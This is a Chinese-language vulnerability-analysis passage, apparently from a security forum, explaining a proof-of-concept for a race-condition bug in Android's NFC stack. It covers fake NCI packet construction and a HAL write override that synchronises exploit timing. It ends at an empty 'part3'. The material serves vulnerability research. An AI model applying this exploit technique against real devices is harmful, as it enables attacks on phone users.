
`GKI_send_event` 将 `event` 从一个 task 发送给另一个 task。任务之间使用 `event` 数据结构的数据包，经安卓的 HwBinder 进行消息传递。HwBinder 是谷歌专门为供应商设计的进程间通信框架，独立于安卓系统的 binder 存在，是从 8.0 以后引入的新机制。

`NFA_Enable` 执行完后，除了测试框架调用 `Test` 的主线程外，进程中会多出两个线程，这两个线程就是两个 task，可近似理解为一个是 NFCC，另一个充当客户端，这两个线程之间互相发数据包交互。作为服务端的 task 维护了一个命令队列，里面存放要被执行的命令，通过 `nfc_ncif_check_cmd_queue` 去检查队列里有没有命令，如果有就去执行。`nfc_task` 是这个事件处理消息的主循环，循环解析命令事件并执行相应的回调函数。代码如下，前一个 `if` 分支负责处理初始化，后一个 `if` 是主循环：

```
uint32_t nfc_task(__attribute__((unused)) uint32_t arg) {
  ...
  /* main loop */
  while (true) {
    event = GKI_wait(0xFFFF, 0);
    ...
    /* Handle NFC_TASK_EVT_TRANSPORT_READY from NFC HAL */
    if (event & NFC_TASK_EVT_TRANSPORT_READY) {
      ...
      nfc_set_state(NFC_STATE_CORE_INIT);
      nci_snd_core_reset(NCI_RESET_TYPE_RESET_CFG);
    }
    if (event & NFC_MBOX_EVT_MASK) {
      /* Process all incoming NCI messages */
      while ((p_msg = (NFC_HDR*)GKI_read_mbox(NFC_MBOX_ID)) != nullptr) {
        free_buf = true;
        /* Determine the input message type. */
        switch (p_msg->event & NFC_EVT_MASK) {
          case BT_EVT_TO_NFC_NCI:
            free_buf = nfc_ncif_process_event(p_msg);
            break;
          case BT_EVT_TO_START_TIMER:
            /* Start nfc_task 1-sec resolution timer */
            GKI_start_timer(NFC_TIMER_ID, GKI_SECS_TO_TICKS(1), true);
            break;
          case BT_EVT_TO_START_QUICK_TIMER:
            /* Quick-timer is required for LLCP */
            GKI_start_timer(
                NFC_QUICK_TIMER_ID,
                ((GKI_SECS_TO_TICKS(1) / QUICK_TIMER_TICKS_PER_SEC)), true);
            break;
          case BT_EVT_TO_NFC_MSGS:
            nfc_main_handle_hal_evt((tNFC_HAL_EVT_MSG*)p_msg);
            break;
          default:
            DLOG_IF(INFO, nfc_debug_enabled) << StringPrintf(
                "nfc_task: unhandle mbox message, event=%04x", p_msg->event);
            break;
        }
        if (free_buf) {
          GKI_freebuf(p_msg);
        }
      }
    }
    ...
  }
}
```

### part2

第二部分代码如下所示：

```
std::vector<uint8_t> reset_core = {0x1, 0x29, 0x20};
g_callback_tracker->SimulatePacketArrival(
    NCI_MT_NTF, 0, NCI_GID_CORE, NCI_MSG_CORE_RESET, reset_core.data(),
    reset_core.size());
{
  std::unique_lock<std::mutex> reset_done_lock(cv_mutex);
  reset_done_cv.wait(reset_done_lock);
}
```

`SimulatePacketArrival` 是 poc 调用频率最高的函数，模拟了从 task 之间数据交互的过程。

task 之间使用 NCI 数据包通信，NCI 数据包的格式简要概述为：

头部共 3 字节：

```
/* NCI Command and Notification Format:
 * 3 byte message header:
 * byte 0: MT PBF GID
 * byte 1: OID
 * byte 2: Message Length
 */
/* MT: Message Type (byte 0) */
```

头部后面跟实际数据，如下所示：

![](https://bbs.kanxue.com/upload/attach/202112/803510_YBDRZBGN68R4G99.png)

`SimulatePacketArrival` 如何构造数据包呢？以它第一次被调用为例：

```
SimulatePacketArrival(NCI_MT_NTF, 0, NCI_GID_CORE, NCI_MSG_CORE_RESET, reset_core.data(), reset_core.size());
```

对比它的函数原型：

```
void SimulatePacketArrival(uint8_t mt, uint8_t pbf, uint8_t gid, uint8_t opcode, uint8_t* data, size_t size);
```

可知 `mt` -> `NCI_MT_NTF`，`pbf` -> `0`，`gid` -> `NCI_GID_CORE`，`opcode` -> `NCI_MSG_CORE_RESET`，`data` -> `reset_core.data()`，`size` -> `reset_core.size()`，`std::vector<uint8_t> reset_core` -> `{0x1, 0x29, 0x20};`。

先构造前三个 octet 组成头部，然后在末尾插入数据：

```
std::vector<uint8_t> buffer(3);
buffer[0] = (mt << NCI_MT_SHIFT) | (pbf << NCI_PBF_SHIFT) | gid; // 第一个8位,
buffer[1] = (mt == NCI_MT_DATA) ? 0 : opcode; // 第二个8位
buffer[2] = static_cast<uint8_t>(size); // 第三个8位
buffer.insert(buffer.end(), data, data + size); // 尾部附加的实际数据是{0x1, 0x29, 0x20}
data_callback_(buffer.size(), buffer.data());
```

接着调用 `data_callback_` 函数发送数据给另一个 task。

每一次 `SimulatePacketArrival` 调用后面都有一个代码块，例如：

```
{
  std::unique_lock<std::mutex> reset_done_lock(cv_mutex);
  reset_done_cv.wait(reset_done_lock);
}
```

`reset_done_cv` 是一个条件变量，条件变量是 C++11 引入的一种同步机制。调用 `reset_done_cv.wait()` 时会将线程挂起，直到其他线程调用 `notify()` 时才解除阻塞继续执行。合理运用条件变量可以实现不同线程之间的同步。

比如 `reset_done_cv` 解除阻塞的时机是在调用 `FakeWrite` 的时候，调用栈是：

```
(gdb) bt
#0  0x000000555558b804 in FakeWrite(unsigned short, unsigned char*) ()
#1  0x0000007fb63ba7fc in nfc_ncif_check_cmd_queue (p_buf=0x7300007fb644f440) at system/nfc/src/nfc/nfc/nfc_ncif.cc:337
#2  0x0000007fb63bb7cc in nfc_ncif_send_cmd (p_buf=<optimized out>) at system/nfc/src/nfc/nfc/nfc_ncif.cc:402
#3  0x0000007fb63ae370 in nci_snd_core_init (nci_version=32 ' ') at system/nfc/src/nfc/nci/nci_hmsgs.cc:94
#4  0x0000007fb63c1f44 in nfc_ncif_proc_reset_rsp (p=<optimized out>, is_ntf=<optimized out>) at system/nfc/src/nfc/nfc/nfc_ncif.cc:1741
#5  0x0000007fb63b00c8 in nci_proc_core_ntf (p_msg=<optimized out>) at system/nfc/src/nfc/nci/nci_hrcv.cc:135
#6  0x0000007fb63bc1b8 in nfc_ncif_process_event (p_msg=<optimized out>) at system/nfc/src/nfc/nfc/nfc_ncif.cc:505
#7  0x0000007fb63c3df4 in nfc_task (arg=<optimized out>) at system/nfc/src/nfc/nfc/nfc_task.cc:378
#8  0x0000007fb6436758 in gki_task_entry (params=<optimized out>) at system/nfc/src/gki/ulinux/gki_ulinux.cc:96
#9  0x0000007fb5cfe9b8 in __pthread_start (arg=0x7f31d23cc0) at bionic/libc/bionic/pthread_create.cpp:347
...
```

`nfc_ncif_check_cmd_queue` 函数会调用 `HAL_WRITE(p_buf)` 函数发数据给 HAL。虽然从调用栈看不出 `FakeWrite` 实际就是 `HAL_WRITE`，但我们之前重载了 `HAL_WRITE` 的函数指针，所以 `HAL_WRITE` 实际就是 `FakeWrite`。

```
void FakeWrite(uint16_t data_len, uint8_t* p_data) {
  uint8_t reset_pattern[5] = {0x20, 0x1, 0x2, 0x0, 0x0};
  if (data_len == 5 && !memcmp(reset_pattern, p_data, data_len)) {
    reset_done_cv.notify_one();
  }

  uint8_t i93_detect_pattern[6] = {0x0, 0x0, 0x3, 0x26, 0x1, 0x0};
  if (data_len == 6 && !memcmp(i93_detect_pattern, p_data, data_len)) {
    i93_detect_cv.notify_one();
  }

  uint8_t t3t_get_system_codes_pattern[7] = {0x21, 0x8, 0x4, 0xff, 0xff, 0x1, 0xf};
  if (data_len == 7 &&
      !memcmp(t3t_get_system_codes_pattern, p_data, data_len)) {
    t3t_get_system_codes_cv.notify_one();
  }
}
```

因为写入 NFC 需要被频繁调用，必须判断到来的数据包是否符合要求才能执行对应的操作，所以第一个 `if` 中判断：

```
if (data_len == 5 && !memcmp(reset_pattern, p_data, data_len))
```

符合条件就会调用 `reset_done_cv.notify_one()` 解除阻塞。这里重载 HAL 函数指针的优势就显现出来了。`FakeWrite` 函数除了向 HAL 发送/写入数据之外，还增加了解除 poc 中各种条件变量阻塞的功能，方便了在竞态漏洞利用中进行时序同步。

### part3

代码是
